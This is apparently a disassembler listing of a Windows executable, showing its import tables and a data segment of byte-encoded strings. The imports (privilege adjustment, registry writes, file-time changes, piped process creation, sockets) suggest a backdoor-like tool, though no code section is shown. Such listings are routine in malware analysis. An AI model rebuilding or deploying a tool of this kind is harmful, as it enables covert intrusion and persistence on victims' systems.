; BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage)
extrn PeekNamedPipe:dword
; BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
extrn ReadFile:dword
; BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
extrn CreateProcessA:dword
; int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar)
extrn MultiByteToWideChar:dword
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes)
extrn GlobalAlloc:dword
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
extrn GlobalFree:dword
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
extrn FindFirstFileA:dword
; BOOL __stdcall FindClose(HANDLE hFindFile)
extrn FindClose:dword
; BOOL __stdcall GetFileTime(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime)
extrn GetFileTime:dword
; BOOL __stdcall SetFileTime(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime)
extrn SetFileTime:dword
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
extrn GetSystemTime:dword
; BOOL __stdcall SystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime)
extrn SystemTimeToFileTime:dword
; LONG __stdcall CompareFileTime(const FILETIME *lpFileTime1, const FILETIME *lpFileTime2)
extrn CompareFileTime:dword
; DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
extrn GetFileSize:dword
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
extrn GetLocalTime:dword
; BOOL __stdcall RemoveDirectoryA(LPCSTR lpPathName)
extrn RemoveDirectoryA:dword
; DWORD __stdcall GetPriorityClass(HANDLE hProcess)
extrn GetPriorityClass:dword
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
extrn OpenProcess:dword
; HANDLE __stdcall GetCurrentProcess()
extrn GetCurrentProcess:dword
; BOOL __stdcall DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
extrn DuplicateHandle:dword
; DWORD __stdcall GetLastError()
extrn GetLastError:dword
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
extrn LocalFree:dword
; HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)
extrn __imp_CreateToolhelp32Snapshot:dword
; BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
extrn __imp_Process32First:dword
; BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
extrn __imp_Process32Next:dword
; BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
extrn FindNextFileA:dword
; DWORD __stdcall GetLogicalDriveStringsA(DWORD nBufferLength, LPSTR lpBuffer)
extrn GetLogicalDriveStringsA:dword
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
extrn GetDriveTypeA:dword
; BOOL __stdcall GetVolumeInformationA(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize)
extrn GetVolumeInformationA:dword
; BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize)
extrn GetComputerNameA:dword
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode)
extrn TerminateProcess:dword
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
extrn CreateFileA:dword
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
extrn WriteFile:dword
; BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)
extrn GetVersionExA:dword
; LANGID __stdcall GetSystemDefaultLangID()
extrn GetSystemDefaultLangID:dword
; HANDLE __stdcall OpenMutexA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
extrn OpenMutexA:dword
; int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2)
extrn lstrcmpiA:dword
; BOOL __stdcall CloseHandle(HANDLE hObject)
extrn CloseHandle:dword
; void __stdcall __noreturn ExitProcess(UINT uExitCode)
extrn ExitProcess:dword
; BOOL __stdcall SetEvent(HANDLE hEvent)
extrn SetEvent:dword
; DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
extrn WaitForSingleObject:dword
; void __stdcall Sleep(DWORD dwMilliseconds)
extrn Sleep:dword
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
extrn CreateMutexA:dword
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
extrn DeleteFileA:dword
; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize)
extrn GetWindowsDirectoryA:dword
; BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes)
extrn CreateDirectoryA:dword
; DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName)
extrn GetFileAttributesA:dword
; BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes)
extrn SetFileAttributesA:dword
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
extrn CopyFileA:dword
; HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName)
extrn LoadLibraryA:dword
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
extrn GetProcAddress:dword
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
extrn CreateThread:dword
; HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName)
extrn CreateEventA:dword
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
extrn FreeLibrary:dword

;
; Imports from MPR.dll
;
; DWORD __stdcall WNetCloseEnum(HANDLE hEnum)
extrn __imp_WNetCloseEnum:dword

;
; Imports from MSVCRT.dll
;
; unsigned int __cdecl _controlfp(unsigned int NewValue, unsigned int Mask)
extrn __imp__controlfp:dword
extrn __imp__except_handler3:dword
extrn __set_app_type:dword
extrn __p__fmode:dword
extrn __p__commode:dword
extrn _adjust_fdiv:dword
extrn __setusermatherr:dword
extrn __imp__initterm:dword
extrn __getmainargs:dword
extrn _acmdln:dword
; void __cdecl __noreturn exit(int Code)
extrn exit:dword
extrn __imp__XcptFilter:dword
; void __cdecl __noreturn exit(int Code)
extrn _exit:dword
; int static swprintf(wchar_t *String, size_t Count, const wchar_t *Format, ...)
extrn swprintf:dword
; FILE *__cdecl fopen(const char *Filename, const char *Mode)
extrn fopen:dword
; int __cdecl fseek(FILE *File, int Offset, int Origin)
extrn fseek:dword
; size_t __cdecl fread(void *DstBuf, size_t ElementSize, size_t Count, FILE *File)
extrn fread:dword
; int __cdecl fclose(FILE *File)
extrn fclose:dword
; int __cdecl strnicmp(const char *Str1, const char *Str, size_t MaxCount)
extrn _strnicmp:dword
; void __cdecl free(void *Memory)
extrn free:dword
; char *__cdecl strstr(const char *Str, const char *SubStr)
extrn strstr:dword
; int __cdecl atoi(const char *Str)
extrn atoi:dword
; int sprintf(char *Dest, const char *Format, ...)
extrn sprintf:dword
; int __cdecl rename(const char *OldFilename, const char *NewFilename)
extrn rename:dword
; char *__cdecl strrchr(const char *Str, int Ch)
extrn strrchr:dword
; time_t __cdecl static time(time_t *Time)
extrn time:dword
; void __cdecl srand(unsigned int Seed)
extrn srand:dword
; int __cdecl rand()
extrn rand:dword
; void *__cdecl malloc(size_t Size)
extrn malloc:dword
extrn __imp___CxxFrameHandler:dword
; size_t __cdecl fwrite(const void *Str, size_t Size, size_t Count, FILE *File)
extrn fwrite:dword
; char *__cdecl strchr(const char *Str, int Val)
extrn strchr:dword
; char *__cdecl itoa(int Val, char *DstBuf, int Radix)
extrn _itoa:dword

;
; Imports from NETAPI32.dll
;
; DWORD __stdcall NetGetDCName(LPCWSTR servername, LPCWSTR domainname, LPBYTE *bufptr)
extrn __imp_NetGetDCName:dword
; DWORD __stdcall NetApiBufferFree(LPVOID Buffer)
extrn __imp_NetApiBufferFree:dword

;
; Imports from SHELL32.dll
;
; BOOL __stdcall SHGetSpecialFolderPathA(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate)
extrn SHGetSpecialFolderPathA:dword

;
; Imports from SHLWAPI.dll
;
; LSTATUS __stdcall SHSetValueA(HKEY hkey, LPCSTR pszSubKey, LPCSTR pszValue, DWORD dwType, LPCVOID pvData, DWORD cbData)
extrn SHSetValueA:dword
; LSTATUS __stdcall SHDeleteKeyA(HKEY hkey, LPCSTR pszSubKey)
extrn SHDeleteKeyA:dword

;
; Imports from WSOCK32.dll
;
extrn WSOCK32_52:dword
extrn WSOCK32_111:dword
extrn WSOCK32_57:dword
extrn WSOCK32_10:dword
extrn WSOCK32_23:dword
extrn WSOCK32_12:dword
extrn WSOCK32_9:dword
extrn WSOCK32_4:dword
extrn WSOCK32_18:dword
extrn WSOCK32_3:dword
extrn WSOCK32_16:dword
extrn WSOCK32_115:dword
extrn WSOCK32_116:dword
extrn WSOCK32_11:dword



; Segment type: Pure data
; Segment permissions: Read
_rdata segment para public 'DATA' use32
assume cs:_rdata
;org 408214h
align 8
stru_408218 _SCOPETABLE_ENTRY <0FFFFFFFFh, \ ; SEH scope table for function 40742F
                   offset loc_40756D, \
                   offset loc_407581>
align 8
stru_408228 FuncInfo_V1 <19930520h, 2, \
             offset stru_408248, 1, \
             offset stru_408258, 0, 0>
align 8
stru_408248 UnwindMapEntry <-1, 0>
UnwindMapEntry <-1, 0>
stru_408258 TryBlockMapEntry <0, 0, 1, 1, \
                  offset stru_408270>
align 10h
stru_408270 HandlerType <0, 0, 0, offset loc_401067>
__IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_408334 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aAdvapi32Dll     ; DLL Name
dd rva RegCloseKey      ; Import Address Table
__IMPORT_DESCRIPTOR_WSOCK32 dd rva dword_40850C ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aWsock32Dll      ; DLL Name
dd rva WSOCK32_52       ; Import Address Table
__IMPORT_DESCRIPTOR_MPR dd rva off_40845C ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aMprDll          ; DLL Name
dd rva __imp_WNetCloseEnum ; Import Address Table
__IMPORT_DESCRIPTOR_SHLWAPI dd rva off_408500 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aShlwapiDll      ; DLL Name
dd rva SHSetValueA      ; Import Address Table
__IMPORT_DESCRIPTOR_NETAPI32 dd rva off_4084EC ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aNetapi32Dll     ; DLL Name
dd rva __imp_NetGetDCName ; Import Address Table
__IMPORT_DESCRIPTOR_SHELL32 dd rva off_4084F8 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aShell32Dll      ; DLL Name
dd rva SHGetSpecialFolderPathA ; Import Address Table
__IMPORT_DESCRIPTOR_MSVCRT dd rva off_408464 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aMsvcrtDll       ; DLL Name
dd rva __imp__controlfp ; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd rva off_408378 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aKernel32Dll     ; DLL Name
dd rva GetStartupInfoA  ; Import Address Table
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
;
; Import names for ADVAPI32.dll
;
off_408334 dd rva word_408548
dd rva word_408556
dd rva word_408568
dd rva word_40857C
dd rva word_40858E
dd rva word_4085A0
dd rva word_4085B0
dd rva word_4085C2
dd rva word_4085D6
dd rva word_4085EE
dd rva word_408606
dd rva word_40861C
dd rva word_408630
dd rva word_408640
dd rva word_408654
dd rva word_408664
dd 0
;
; Import names for KERNEL32.dll
;
off_408378 dd rva word_408C56
dd rva word_408C42
dd rva word_408C32
dd rva word_408C26
dd rva word_408C14
dd rva word_408BFE
dd rva word_408BF0
dd rva word_408BE2
dd rva word_408B38
dd rva word_408B2C
dd rva word_408BD4
dd rva word_408BC6
dd rva word_408BB6
dd rva word_408B9E
dd rva word_408B8C
dd rva word_408B7E
dd rva word_408B6E
dd rva word_408B5A
dd rva word_408B18
dd rva word_408B0A
dd rva word_408AF6
dd rva word_408AE4
dd rva word_408AD4
dd rva word_408AC8
dd rva word_408AAC
dd rva word_408A9A
dd rva word_408A8A
dd rva word_408B4A
dd rva word_408A70
dd rva word_408A60
dd rva word_408A48
dd rva word_408A34
dd rva word_408A20
dd rva word_408A12
dd rva word_408A06
dd rva word_4089F6
dd rva word_4089DC
dd rva word_4089CE
dd rva word_4089C2
dd rva word_4089B4
dd rva word_4089A6
dd rva word_40899A
dd rva word_408984
dd rva word_40897C
dd rva word_40896C
dd rva word_40895E
dd rva word_408946
dd rva word_408932
dd rva word_40891C
dd rva word_408906
dd rva word_4088FA
dd rva word_4088EA
dd rva word_4088D8
dd rva word_4088AA
dd rva word_4088BA
dd rva word_4088CA
dd 0
;
; Import names for MPR.dll
;
off_40845C dd rva word_40868E
dd 0
;
; Import names for MSVCRT.dll
;
off_408464 dd rva word_40889C
dd rva word_408888
dd rva word_408876
dd rva word_408868
dd rva word_408858
dd rva word_408848
dd rva word_408834
dd rva word_408828
dd rva word_408818
dd rva word_40880E
dd rva word_408806
dd rva word_4087F8
dd rva word_4087F0
dd rva word_4087D8
dd rva word_4087C6
dd rva word_4087BE
dd rva word_4087B6
dd rva word_4087AC
dd rva word_4087A0
dd rva word_408798
dd rva word_40878E
dd rva word_40877C
dd rva word_408772
dd rva word_408768
dd rva word_40875E
dd rva word_408756
dd rva word_40874E
dd rva word_408746
dd rva word_40873C
dd rva word_408728
dd rva word_4087CE
dd rva word_408784
dd rva word_408C76
dd 0
;
; Import names for NETAPI32.dll
;
off_4084EC dd rva word_4086E4
dd rva word_4086D0
dd 0
;
; Import names for SHELL32.dll
;
off_4084F8 dd rva word_408702
dd 0
;
; Import names for SHLWAPI.dll
;
off_408500 dd rva word_4086A6
dd rva word_4086B4
dd 0
;
; Import names for WSOCK32.dll
;
dword_40850C dd 80000034h
dd 8000006Fh
dd 80000039h
dd 8000000Ah
dd 80000017h
dd 8000000Ch
dd 80000009h
dd 80000004h
dd 80000012h
dd 80000003h
dd 80000010h
dd 80000073h
dd 80000074h
dd 8000000Bh
dd 0
word_408548 dw 15Bh
db 'RegCloseKey',0
word_408556 dw 186h
db 'RegSetValueExA',0
align 4
word_408568 dw 17Bh
db 'RegQueryValueExA',0
align 4
word_40857C dw 15Fh
db 'RegCreateKeyExA',0
word_40858E dw 164h
db 'RegDeleteValueA',0
word_4085A0 dw 172h
db 'RegOpenKeyExA',0
word_4085B0 dw 1A9h
db 'SetSecurityInfo',0
word_4085C2 dw 197h
db 'SetEntriesInAclA',0
align 2
word_4085D6 dw 17h
db 'AdjustTokenPrivileges',0
word_4085EE dw 0F5h
db 'LookupPrivilegeValueA',0
word_408606 dw 0D0h
db 'GetTokenInformation',0
word_40861C dw 142h
db 'OpenProcessToken',0
align 10h
word_408630 dw 0D7h
db 'GetUserNameA',0
align 10h
word_408640 dw 0EFh
db 'LookupAccountSidA',0
word_408654 dw 167h
db 'RegEnumKeyExA',0
word_408664 dw 16Ah
db 'RegEnumValueA',0
aAdvapi32Dll db 'ADVAPI32.dll',0
align 2
aWsock32Dll db 'WSOCK32.dll',0
word_40868E dw 11h
db 'WNetCloseEnum',0
aMprDll db 'MPR.dll',0
word_4086A6 dw 99h
db 'SHSetValueA',0
word_4086B4 dw 6Ch
db 'SHDeleteKeyA',0
align 4
aShlwapiDll db 'SHLWAPI.dll',0
word_4086D0 dw 48h
db 'NetApiBufferFree',0
align 4
word_4086E4 dw 66h
db 'NetGetDCName',0
align 4
aNetapi32Dll db 'NETAPI32.dll',0
align 2
word_408702 dw 54h
db 'SHGetSpecialFolderPathA',0
aShell32Dll db 'SHELL32.dll',0
word_408728 dw 49h
db '__CxxFrameHandler',0
word_40873C dw 291h
db 'malloc',0
align 2
word_408746 dw 2A6h
db 'rand',0
align 2
word_40874E dw 2B4h
db 'srand',0
word_408756 dw 2D0h
db 'time',0
align 2
word_40875E dw 2C3h
db 'strrchr',0
word_408768 dw 2A9h
db 'rename',0
align 2
word_408772 dw 2B2h
db 'sprintf',0
word_40877C dw 23Dh
db 'atoi',0
align 4
word_408784 dw 2B7h
db 'strchr',0
align 2
word_40878E dw 2C5h
db 'strstr',0
align 4
word_408798 dw 25Eh
db 'free',0
align 10h
word_4087A0 dw 1C5h
db '_strnicmp',0
word_4087AC dw 24Ch
db 'fclose',0
align 2
word_4087B6 dw 25Dh
db 'fread',0
word_4087BE dw 262h
db 'fseek',0
word_4087C6 dw 257h
db 'fopen',0
word_4087CE dw 266h
db 'fwrite',0
align 4
word_4087D8 dw 2CBh
db 'swprintf',0
align 4
aMsvcrtDll db 'MSVCRT.dll',0
align 10h
word_4087F0 dw 0D3h
db '_exit',0
word_4087F8 dw 48h
db '_XcptFilter',0
word_408806 dw 249h
db 'exit',0
align 2
word_40880E dw 8Fh
db '_acmdln',0
word_408818 dw 58h
db '__getmainargs',0
word_408828 dw 10Fh
db '_initterm',0
word_408834 dw 83h
db '__setusermatherr',0
align 4
word_408848 dw 9Dh
db '_adjust_fdiv',0
align 4
word_408858 dw 6Ah
db '__p__commode',0
align 4
word_408868 dw 6Fh
db '__p__fmode',0
align 2
word_408876 dw 81h
db '__set_app_type',0
align 4
word_408888 dw 0CAh
db '_except_handler3',0
align 4
word_40889C dw 0B7h
db '_controlfp',0
align 2
word_4088AA dw 4Ah
db 'CreateThread',0
align 2
word_4088BA dw 31h
db 'CreateEventA',0
align 2
word_4088CA dw 0B4h
db 'FreeLibrary',0
word_4088D8 dw 13Eh
db 'GetProcAddress',0
align 2
word_4088EA dw 1C2h
db 'LoadLibraryA',0
align 2
word_4088FA dw 28h
db 'CopyFileA',0
word_408906 dw 268h
db 'SetFileAttributesA',0
align 4
word_40891C dw 10Dh
db 'GetFileAttributesA',0
align 2
word_408932 dw 2Dh
db 'CreateDirectoryA',0
align 2
word_408946 dw 17Dh
db 'GetWindowsDirectoryA',0
align 2
word_40895E dw 57h
db 'DeleteFileA',0
word_40896C dw 3Fh
db 'CreateMutexA',0
align 4
word_40897C dw 296h
db 'Sleep',0
word_408984 dw 2CEh
db 'WaitForSingleObject',0
word_40899A dw 265h
db 'SetEvent',0
align 2
word_4089A6 dw 7Dh
db 'ExitProcess',0
word_4089B4 dw 1Bh
db 'CloseHandle',0
word_4089C2 dw 2FFh
db 'lstrcmpiA',0
word_4089CE dw 1EDh
db 'OpenMutexA',0
align 4
word_4089DC dw 158h
db 'GetSystemDefaultLangID',0
align 2
word_4089F6 dw 175h
db 'GetVersionExA',0
word_408A06 dw 2DFh
db 'WriteFile',0
word_408A12 dw 34h
db 'CreateFileA',0
word_408A20 dw 29Eh
db 'TerminateProcess',0
align 4
word_408A34 dw 0CEh
db 'GetComputerNameA',0
align 4
word_408A48 dw 177h
db 'GetVolumeInformationA',0
word_408A60 dw 104h
db 'GetDriveTypeA',0
word_408A70 dw 11Eh
db 'GetLogicalDriveStringsA',0
word_408A8A dw 1FEh
db 'Process32Next',0
word_408A9A dw 1FCh
db 'Process32First',0
align 4
word_408AAC dw 4Ch
db 'CreateToolhelp32Snapshot',0
align 4
word_408AC8 dw 1CCh
db 'LocalFree',0
word_408AD4 dw 11Ah
db 'GetLastError',0
align 4
word_408AE4 dw 63h
db 'DuplicateHandle',0
word_408AF6 dw 0F7h
db 'GetCurrentProcess',0
word_408B0A dw 1EFh
db 'OpenProcess',0
word_408B18 dw 133h
db 'GetPriorityClass',0
align 4
word_408B2C dw 90h
db 'FindClose',0
word_408B38 dw 94h
db 'FindFirstFileA',0
align 2
word_408B4A dw 9Dh
db 'FindNextFileA',0
word_408B5A dw 227h
db 'RemoveDirectoryA',0
align 2
word_408B6E dw 11Bh
db 'GetLocalTime',0
align 2
word_408B7E dw 112h
db 'GetFileSize',0
word_408B8C dw 20h
db 'CompareFileTime',0
word_408B9E dw 29Bh
db 'SystemTimeToFileTime',0
align 2
word_408BB6 dw 15Dh
db 'GetSystemTime',0
word_408BC6 dw 26Ch
db 'SetFileTime',0
word_408BD4 dw 114h
db 'GetFileTime',0
word_408BE2 dw 188h
db 'GlobalFree',0
align 10h
word_408BF0 dw 181h
db 'GlobalAlloc',0
word_408BFE dw 1E4h
db 'MultiByteToWideChar',0
word_408C14 dw 44h
db 'CreateProcessA',0
align 2
word_408C26 dw 218h
db 'ReadFile',0
align 2
word_408C32 dw 1F9h
db 'PeekNamedPipe',0
word_408C42 dw 126h
db 'GetModuleHandleA',0
align 2
word_408C56 dw 150h
db 'GetStartupInfoA',0
aKernel32Dll db 'KERNEL32.dll',0
align 2
word_408C76 dw 134h
db '_itoa',0
align 400h
_rdata ends

; Section 3. (virtual address 00009000)
; Virtual size                  : 00001D1C (   7452.)
; Section size in file          : 00001000 (   4096.)
; Offset to raw data for section: 00009000
; Flags C0000040: Data Readable Writable
; Alignment     : default

; Segment type: Pure data
; Segment permissions: Read/Write
_data segment para public 'DATA' use32
assume cs:_data
;org 409000h
unk_409000 db    0
db    0
db    0
db    0
unk_409004 db    0
db    0
db    0
db    0
unk_409008 db    0
db    0
db    0
db    0
unk_40900C db    0
db    0
db    0
db    0
unk_409010 db  5Eh ; ^
db  80h ; €
db  9Bh ; ›
db  99h ; ™
db  82h ; ‚
db  97h ; —
db  79h ; y
db  5Eh ; ^
db    0
db    0
db    0
db    0
; CHAR SubKey[1]
SubKey db 'i'
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  8Dh
db  97h ; —
db  86h ; †
db  9Bh ; ›
db  90h
db  63h ; c
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  90h
db  79h ; y
db  8Bh ; ‹
db  86h ; †
db  86h ; †
db  9Bh ; ›
db  82h ; ‚
db  88h ; ˆ
db  62h ; b
db  9Bh ; ›
db  88h ; ˆ
db  7Fh ; 
db  82h ; ‚
db  9Ah ; š
db    0
db    0
db    0
db    0
; CHAR aIoihC[6]
aIoihC db 'ioih{c'
db  90h
db  79h ; y
db  8Bh ; ‹
db  86h ; †
db  86h ; †
db  9Bh ; ›
db  82h ; ‚
db  88h ; ˆ
db  79h ; y
db  85h ; …
db  82h ; ‚
db  88h ; ˆ
db  86h ; †
db  85h ; …
db  80h ; €
db  69h ; i
db  9Bh ; ›
db  88h ; ˆ
db  90h
db  79h ; y
db  85h ; …
db  82h ; ‚
db  88h ; ˆ
db  86h ; †
db  85h ; …
db  80h ; €
db  90h
db  60h ; `
db  89h ; ‰
db  97h ; —
db    0
db    0
db    0
db    0
; CHAR aI[1]
aI db 'i'
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  8Dh
db  97h ; —
db  86h ; †
db  9Bh ; ›
db  90h
db  63h ; c
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  90h
db  6Dh ; m
db  9Fh ; Ÿ
db  82h ; ‚
db  98h ; ˜
db  85h ; …
db  8Dh
db  89h ; ‰
db  90h
db  79h ; y
db  8Bh ; ‹
db  86h ; †
db  86h ; †
db  9Bh ; ›
db  82h ; ‚
db  88h ; ˆ
db  6Ah ; j
db  9Bh ; ›
db  86h ; †
db  89h ; ‰
db  9Fh ; Ÿ
db  85h ; …
db  82h ; ‚
db  90h
db  64h ; d
db  85h ; …
db  80h ; €
db  9Fh ; Ÿ
db  99h ; ™
db  9Fh ; Ÿ
db  9Bh ; ›
db  89h ; ‰
db  90h
db  7Bh ; {
db  8Ch ; Œ
db  84h ; „
db  80h ; €
db  85h ; …
db  86h ; †
db  9Bh ; ›
db  86h ; †
db  90h
db  66h ; f
db  8Bh ; ‹
db  82h ; ‚
db    0
; CHAR aC_1[1]
aC_1 db 'c'
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  6Eh ; n
db  9Eh ; ž
db    0
; CHAR Name[1]
Name db 'c'
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  7Bh ; {
db  8Ch ; Œ
db  9Fh ; Ÿ
db  88h ; ˆ
db    0
db    0
db    0
; CHAR aC[1]
aC db 'c'
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  7Ch ; |
db  97h ; —
db  8Ah ; Š
db  9Bh ; ›
db  7Bh ; {
db  8Ch ; Œ
db  9Fh ; Ÿ
db  88h ; ˆ
db    0
db    0
db    0
; CHAR aC_0[1]
aC_0 db 'c'
db  9Fh ; Ÿ
db  99h ; ™
db  86h ; †
db  85h ; …
db  89h ; ‰
db  85h ; …
db  9Ah ; š
db  88h ; ˆ
db  7Ch ; |
db  97h ; —
db  8Ah ; Š
db  9Bh ; ›
db  77h ; w
db  99h ; ™
db  81h
db    0
db    0
db    0
db    0
; const CHAR String2
String2 db 7Fh
aLdEfBL db '{ld`ef{B{l{',0
align 4
unk_4090FC db  90h
db  58h ; X
db  62h ; b
db  88h ; ˆ
db  6Bh ; k
db  82h ; ‚
db  9Fh ; Ÿ
db  82h ; ‚
db  89h ; ‰
db  88h ; ˆ
db  97h ; —
db  80h ; €
db  80h ; €
db  61h ; a
db  76h ; v
db  4Fh ; O
db  46h ; F
db  46h ; F
db  4Bh ; K
db  4Ch ; L
db  46h ; F
db  58h ; X
db    0
db    0
unk_409114 db  90h
db  9Ah ; š
db  80h ; €
db  88h ; ˆ
db  83h ; ƒ
db  81h
db  96h ; –
db  42h ; B
db  98h ; ˜
db  80h ; €
db  80h ; €
db    0
unk_409120 db  45h ; E
db  97h ; —
db  84h ; „
db  84h ; „
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
db    0
db    0
unk_40912C db  45h ; E
db  96h ; –
db  97h ; —
db  81h
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
db    0
db    0
unk_409138 db  45h ; E
db  69h ; i
db  85h ; …
db  83h ; ƒ
db  9Bh ; ›
db  6Bh ; k
db  84h ; „
db  60h ; `
db  9Fh ; Ÿ
db  89h ; ‰
db  88h ; ˆ
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
unk_409148 db  45h ; E
db  69h ; i
db  85h ; …
db  83h ; ƒ
db  9Bh ; ›
db  6Bh ; k
db  84h ; „
db  6Ah ; j
db  9Bh ; ›
db  86h ; †
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
unk_409158 db  45h ; E
db  69h ; i
db  85h ; …
db  83h ; ƒ
db  9Bh ; ›
db  6Bh ; k
db  84h ; „
db  7Bh ; {
db  8Ch ; Œ
db  9Bh ; ›
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
unk_409168 db  41h ; A
db  53h ; S
db  44h ; D
db  46h ; F
db  47h ; G
db  48h ; H
db  3Ah ; :
unk_40916F db  8Dh
db  8Dh
db  8Dh
db  42h ; B
db  81h
db  83h ; ƒ
db  43h ; C
db  82h ; ‚
db  8Fh
db  99h ; ™
db  42h ; B
db  99h ; ™
db  85h ; …
db  83h ; ƒ
db    0
